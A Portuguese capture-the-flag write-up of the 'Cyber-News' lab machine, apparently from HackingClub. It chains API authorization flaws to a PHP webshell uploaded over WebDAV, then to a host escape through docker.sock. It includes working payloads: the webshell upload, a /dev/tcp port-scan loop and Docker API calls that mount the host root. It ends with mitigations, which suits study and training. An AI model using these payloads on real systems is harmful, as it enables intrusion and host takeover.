# 🎯 Writeup — Máquina Cyber-News

> **Dificuldade:** Difícil | **SO:** Linux | **Tags:** `BOPLA` · `Mass Assignment` · `API Versioning (BOLA)` · `IDOR` · `Source Map Leak` · `Hash Cracking` · `WebDAV RCE` · `Nginx Misconfiguration` · `SSRF` · `Docker Escape`

---

## 1. Sumário Executivo

O comprometimento total foi alcançado através de uma cadeia de seis vulnerabilidades encadeadas em uma plataforma de notícias de cibersegurança com múltiplos subdomínios. O ataque iniciou com **BOPLA** (Broken Object Property Level Authorization) no endpoint `/api/articles`, que expunha o objeto `user` completo incluindo hash de senha e flag `isAdmin`. Combinado com **Mass Assignment**, foi possível criar uma conta com privilégios administrativos. Autenticado como admin no blog, **fuzzing de API** revelou a rota `/configs` com o subdomínio do backoffice. No backoffice, **Source Map exposto** revelou rotas internas, e uma falha de **API Versioning (BOLA)** (`v2` → `v1`) expôs a lista de usuários. O hash do usuário `manager` foi quebrado, e um **IDOR** no endpoint de atualização de senha permitiu resetar a senha do `admin`. Com acesso admin ao backoffice, foi possível editar a configuração do Nginx, habilitando acesso à intranet PHP e um servidor WebDAV. O upload de uma webshell PHP via WebDAV resultou em **RCE** no container da intranet. Por fim, a webshell foi usada como proxy para interagir com a aplicação interna **Appmon**, que possuía um sistema de webhooks vulnerável a **SSRF via docker.sock**, permitindo criar um container privilegiado montando o filesystem do host e capturar a flag root.

---

## 2. Reconhecimento

### 2.1 Scan de Portas

```bash
nmap -sC -sV <IP_ALVO>
```

**Resultado:**

| Porta | Serviço |
|-------|---------|
| 22    | SSH     |
| 80    | HTTP (Blog — cybernews.hc) |

### 2.2 Configuração de DNS Local

A aplicação redireciona para `cybernews.hc`. Ao longo do ataque, novos subdomínios foram sendo descobertos e adicionados:

```bash
# Entrada final no /etc/hosts
<IP_ALVO>  cybernews.hc  production-backoffice-kmxy.cybernews.hc  intranet-kizb.cybernews.hc  upload.cybernews.hc
```

### 2.3 Reconhecimento da Aplicação Blog

- Aplicação de blog com registro e login de usuários
- API REST em `/api/`
- Endpoint `/api/articles` retorna artigos com objeto `user` completo na resposta

---

## 3. Exploração — Blog (cybernews.hc)

### 3.1 BOPLA — Exposição do Objeto User

**Severidade:** Alta | **CWE-213**

Após registrar e logar na aplicação, a requisição à API de artigos expôs o objeto `user` de todos os usuários na resposta:

```http
GET /api/articles
Authorization: Bearer <JWT>
```

**Resposta (trecho):**
```json
{
  "author": {
    "username": "admin",
    "email": "admin@cybernews.hc",
    "isAdmin": true,
    "password": "<hash>"
  }
}
```

> **Falha:** O endpoint retorna propriedades sensíveis do objeto user (hash de senha, flag `isAdmin`) que não deveriam ser serializadas na resposta da API.

A quebra do hash do admin não obteve sucesso. Porém, o campo `isAdmin: true` foi mapeado para uso posterior.

### 3.2 Mass Assignment — Escalação de Privilégios no Registro

**Severidade:** Crítica | **CWE-915**

Ao interceptar a requisição de registro com Burp Suite, foi adicionado o campo `isAdmin` ao body:

```http
POST /api/auth/register
Content-Type: application/json

{
  "username": "attacker",
  "email": "attacker@test.com",
  "password": "P@ss123!",
  "isAdmin": true
}
```

**Resultado:** A propriedade foi aceita e o usuário foi criado com `isAdmin: true`, confirmado ao verificar `/api/auth/profile`.

> **Falha:** A aplicação não filtra propriedades do objeto recebido antes de persistir no banco. O cliente consegue definir atributos privilegiados diretamente.

### 3.3 Fuzzing de API — Descoberta do Subdomínio do Backoffice

Com o token admin, foi feito fuzzing nas rotas da API:

```bash
ffuf -u http://cybernews.hc/api/FUZZ \
     -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt \
     -H "Authorization: Bearer <JWT_ADMIN>"
```

**Rota descoberta:** `/api/configs`

**Resposta:**
```json
{
  "backoffice_url": "production-backoffice-kmxy.cybernews.hc"
}
```

---

## 4. Exploração — Backoffice (production-backoffice-kmxy.cybernews.hc)

### 4.1 Source Map Exposto — Descoberta de Rotas Internas

**Severidade:** Média | **CWE-540**

O backoffice foi compilado com source maps habilitados em produção, expondo os arquivos `.vue` originais. Analisando o `Sidebar.vue`:

```
https://production-backoffice-kmxy.cybernews.hc/js/Sidebar.vue.map
```

**Rota descoberta:** `/users-management`

Ao acessar `/users-management`, o arquivo `fetch_users.js` carregado referenciava o endpoint:

```
/api/v2/bo/users
```

### 4.2 API Versioning (BOLA) — Bypass de Autorização

**Severidade:** Crítica | **CWE-639**

```http
GET /api/v2/bo/users → 403 Forbidden
GET /api/v1/bo/users → 200 OK
```

**Resposta:**
```json
[
  {"id": 1, "username": "admin", "password": "<hash_admin>"},
  {"id": 2, "username": "manager", "password": "<hash_manager>"}
]
```

> **Falha:** A versão v1 da API não implementa as restrições de autorização presentes em v2. Endpoints legados ativos sem controle de acesso adequado.

### 4.3 Hash Cracking — Acesso ao Backoffice

```bash
hashcat -a 0 -m 0 hash_manager.txt /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
```

Senha do usuário `manager` obtida. Login realizado no backoffice.

### 4.4 IDOR — Reset de Senha do Admin

**Severidade:** Crítica | **CWE-639**

Ao atualizar a própria senha, a requisição capturada no Burp Suite:

```http
PUT /api/v2/bo/users/2
Authorization: Bearer <JWT_manager>
Content-Type: application/json

{"password": "nova_senha"}
```

Alterando o ID de `2` (manager) para `1` (admin):

```http
PUT /api/v2/bo/users/1
```

**Resultado:** Senha do admin resetada com sucesso. Acesso admin ao backoffice obtido.

---

## 5. Exploração — RCE via Nginx Misconfiguration + WebDAV

### 5.1 Edição da Configuração do Nginx

**Severidade:** Crítica | **CWE-16**

O painel admin do backoffice possui uma funcionalidade de edição da configuração do Nginx. A configuração original do servidor `intranet-kizb.cybernews.hc` possuía restrições de acesso:

```nginx
# Configuração original — bloqueada
location / {
    allow 127.0.0.1;
    deny all;
}
```

A configuração foi substituída pela versão abaixo, removendo as restrições e adicionando um servidor WebDAV dedicado:

```nginx
server {
    listen 80;
    server_name intranet-kizb.cybernews.hc;

    root /usr/share/nginx/intranet;
    index index.php;
    client_max_body_size 100M;

    location ~ \.php$ {
        try_files $uri =404;
        fastcgi_pass php-fpm:9000;
        fastcgi_index index.php;
        include fastcgi_params;
        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
    }
}

server {
    listen 80;
    server_name upload.cybernews.hc;

    root /;

    location ~ "/upl/([0-9a-zA-Z-.]*)$" {
        alias /usr/share/nginx/intranet/uploads/$1;
        client_body_temp_path /tmp/upl_tmp;
        dav_methods PUT DELETE MKCOL COPY MOVE;
        create_full_put_path on;
        dav_access group:rw all:r;
    }
}
```

### 5.2 Upload de Webshell via WebDAV

Com o servidor `upload.cybernews.hc` ativo:

```bash
curl -X PUT "http://upload.cybernews.hc/upl/cmd.php" \
  -H "Content-Type: application/octet-stream" \
  --data-binary '<?php system($_GET["c"]); ?>'
# HTTP 201 Created
```

### 5.3 Confirmação de RCE

```bash
curl "http://intranet-kizb.cybernews.hc/uploads/cmd.php?c=id"
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### 5.4 Flag de Usuário

```bash
curl "http://intranet-kizb.cybernews.hc/uploads/cmd.php?c=cat+/user.txt"
# hackingclub{187484317a8517d2e1290c88cfa29108}
```

> **Observação:** O container não possui rota de saída para a VPN do atacante — confirmado via `timeout 3 bash -c 'echo >/dev/tcp/10.0.74.117/4444'` retornando `FAIL`. Toda a pós-exploração foi realizada via webshell como proxy curl.

---

## 6. Pós-Exploração — Reconhecimento Interno

### 6.1 Mapeamento de Rede Interna

```bash
# Rede identificada via /proc/net/route: 172.18.0.0/16, gateway 172.18.0.1

# Port scan via /dev/tcp na webshell
curl --get --data-urlencode \
  "c=for host in 2 3 4 5 6 7 8 9 10; do for port in 8000 8080 8592 3000 5000 9000; do \
  (timeout 1 bash -c \"echo >/dev/tcp/172.18.0.\$host/\$port\" 2>/dev/null && \
  echo \"OPEN: 172.18.0.\$host:\$port\"); done; done" \
  "http://intranet-kizb.cybernews.hc/uploads/cmd.php"
```

**Hosts identificados:**

| Host | Porta | Serviço |
|------|-------|---------|
| 172.18.0.4 | 9000 | php-fpm |
| 172.18.0.5 | 8000 | Blog API |
| 172.18.0.6 | 8592 | **Appmon** |
| 172.18.0.7 | 8000 | Backoffice API |

---

## 7. Exploração — Container Escape via docker.sock SSRF (Appmon)

### 7.1 Acesso ao Appmon via Webshell Proxy

```bash
# Registro
curl --get --data-urlencode \
  "c=curl -s http://172.18.0.6:8592/api/auth/register \
  -X POST -H 'Content-Type: application/json' \
  -d '{\"username\":\"pwned\",\"email\":\"pwned@pwn.com\",\"password\":\"P@ss123!\"}'" \
  "http://intranet-kizb.cybernews.hc/uploads/cmd.php"
# {"status":"success","message":"User created successfully!"}

# Login — conta criada com role ADMIN automaticamente pelo Appmon
# access_token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

### 7.2 SSRF via Webhook — docker.sock

**Severidade:** Crítica | **CWE-918**

O sistema de webhooks aceita configuração Axios completa, incluindo `socketPath`, permitindo interagir com o `docker.sock` montado no container Appmon.

**Passo 1 — Criar container com bind mount `/ → /hostfs`:**

```bash
curl --get --data-urlencode "c=curl -s http://172.18.0.6:8592/api/webhook \
  -X POST -H 'Authorization: Bearer <TOKEN>' \
  -H 'Content-Type: application/json' \
  -d '{
    \"url\":\"http://unix:/containers/create\",
    \"socketPath\":\"/var/run/docker.sock\",
    \"method\":\"POST\",
    \"headers\":{\"Content-Type\":\"application/json\"},
    \"data\":{
      \"Image\":\"cybernews-appmon\",
      \"Entrypoint\":[\"/bin/bash\"],
      \"Volumes\":{\"/hostfs/\":{}},
      \"HostConfig\":{\"Binds\":[\"/:/hostfs\"]}
    }
  }'" \
  "http://intranet-kizb.cybernews.hc/uploads/cmd.php"
# {"status":"success","data":{"Id":"4883d64d22bd..."}}
```

**Passo 2 — Iniciar container:**

```bash
# Webhook: POST /containers/4883d64d.../start via docker.sock
# {"status":"success","data":""}
```

**Passo 3 — Exec para leitura da flag:**

```bash
# Webhook: POST /containers/4883d64d.../exec
# Cmd: ["/bin/bash", "-c", "cat /hostfs/root/root.txt"]
# Privileged: true
# Retorna exec_id: 0329a168...
```

**Passo 4 — Executar o exec:**

```bash
# Webhook: POST /exec/0329a168.../start
# {"Detach": false, "Tty": false}
```

**Resultado:**

```
{"status":"success","data":"hackingclub{dd2fc17f7d0a8eba95da25d7be6533d1}\n"}
```

---

## 8. Diagrama da Cadeia de Ataque

```
[Blog — cybernews.hc]
        │
        ├─► BOPLA: /api/articles → objeto user exposto (isAdmin, hash)
        │
        └─► Mass Assignment: registro com "isAdmin":true → conta admin
                │
                └─► Fuzzing: /api/configs → subdomínio backoffice
                        │
        [Backoffice — production-backoffice-kmxy.cybernews.hc]
                        │
                        ├─► Source Map exposto → rota /users-management
                        │
                        ├─► BOLA: /api/v1/bo/users (v2=403, v1=200) → hashes
                        │
                        ├─► Hash cracking → credencial do manager
                        │
                        └─► IDOR: PUT /api/v2/bo/users/1 → reset senha admin
                                │
                                └─► Edição da config do Nginx via admin
                                        │
                                        ├─► intranet liberada (remove allow/deny)
                                        └─► upload.cybernews.hc com WebDAV
                                                │
                        [Intranet — intranet-kizb.cybernews.hc]
                                                │
                                                ├─► PUT cmd.php via WebDAV → HTTP 201
                                                ├─► RCE: www-data no container
                                                └─► Flag user: hackingclub{1874...}
                                                        │
                                [Pivot via webshell proxy — sem saída TCP externa]
                                                        │
                                        [Appmon — 172.18.0.6:8592]
                                                        │
                                                        ├─► Register → Login → JWT ADMIN
                                                        └─► Webhook SSRF → docker.sock
                                                                │
                                                                ├─► /containers/create (Binds: /:/hostfs)
                                                                ├─► /containers/<id>/start
                                                                ├─► /containers/<id>/exec
                                                                └─► /exec/<id>/start
                                                                        │
                                                                        └─► Flag root: hackingclub{dd2f...} ✅
```

---

## 9. Credenciais e Flags

| Item | Valor |
|------|-------|
| **Conta criada (blog)** | `attacker@test.com` / `P@ss123!` com `isAdmin: true` |
| **Usuário backoffice** | `manager` / `<senha quebrada via hashcat>` |
| **Admin backoffice** | `admin` / senha resetada via IDOR |
| **Conta Appmon** | `pwned@pwn.com` / `P@ss123!` (role ADMIN automático) |
| **Flag Usuário** | `hackingclub{187484317a8517d2e1290c88cfa29108}` |
| **Flag Root** | `hackingclub{dd2fc17f7d0a8eba95da25d7be6533d1}` |

---

## 10. Vulnerabilidades Identificadas

| # | Vulnerabilidade | Severidade | CWE / Referência |
|---|-----------------|------------|------------------|
| 1 | BOPLA — `/api/articles` serializa objeto `user` completo | Alta | CWE-213, OWASP API3 |
| 2 | Mass Assignment — campo `isAdmin` aceito no registro | Crítica | CWE-915, OWASP API6 |
| 3 | Source Map exposto em produção (backoffice Vue.js) | Média | CWE-540 |
| 4 | BOLA/API Versioning — `/api/v1/bo/users` sem autorização | Crítica | CWE-639, OWASP API1 |
| 5 | IDOR — `PUT /api/v2/bo/users/{id}` sem validação de propriedade | Crítica | CWE-639, OWASP API1 |
| 6 | Nginx config editável via backoffice admin + WebDAV sem allowlist | Crítica | CWE-16 |
| 7 | Upload irrestrito de PHP via WebDAV → RCE | Crítica | CWE-434 |
| 8 | SSRF via Webhook (Axios `socketPath`) → acesso ao docker.sock | Crítica | CWE-918, OWASP API7 |
| 9 | docker.sock montado no container Appmon sem isolamento | Crítica | CWE-269 |

---

## 11. Ferramentas Utilizadas

| Ferramenta | Uso |
|------------|-----|
| `nmap` | Scan de portas e serviços |
| `ffuf` | Fuzzing de rotas de API |
| `Burp Suite` | Interceptação e manipulação de requisições HTTP |
| `hashcat` | Quebra de hashes de senha |
| `curl` | Interação com APIs, WebDAV e proxy via webshell |
| Webshell PHP (`cmd.php`) | Proxy para interação com rede interna isolada |
| Docker API (unix socket) | Container escape via docker.sock SSRF |

---

## 12. Recomendações de Mitigação

1. **BOPLA:** Usar DTOs com serialização explícita dos campos. Nunca retornar o objeto de entidade completo na resposta da API — filtrar hash de senha, flags internas e propriedades administrativas.

2. **Mass Assignment:** Implementar whitelist de propriedades permitidas no corpo da requisição. Campos como `isAdmin` e `role` devem ser gerenciados apenas internamente, nunca via input do cliente.

3. **Source Map:** Desabilitar geração de source maps em builds de produção (`sourcemap: false` no `vite.config.js` ou webpack equivalente).

4. **API Versioning (BOLA):** Versões legadas devem implementar os mesmos controles de autorização das versões atuais ou ser desativadas. Auditar todos os endpoints ativos em cada versão.

5. **IDOR:** Validar no backend se o recurso solicitado pertence ao usuário autenticado. Usar UUIDs aleatórios em vez de IDs sequenciais.

6. **Nginx / WebDAV:** Restringir acesso à edição da configuração do Nginx a processos internos auditados. O WebDAV deve implementar allowlist de extensões — nunca permitir upload de `.php` ou outros tipos executáveis.

7. **docker.sock:** Nunca montar o socket do Docker em containers de aplicação. Se necessário usar a API Docker, utilizar `docker-socket-proxy` com escopo mínimo e autenticação.

8. **SSRF via Webhook:** Validar e restringir URLs aceitas no sistema de webhooks. Bloquear schemes `unix:`, IPs RFC-1918 e loopback. Não expor `socketPath` como parâmetro configurável pelo usuário.
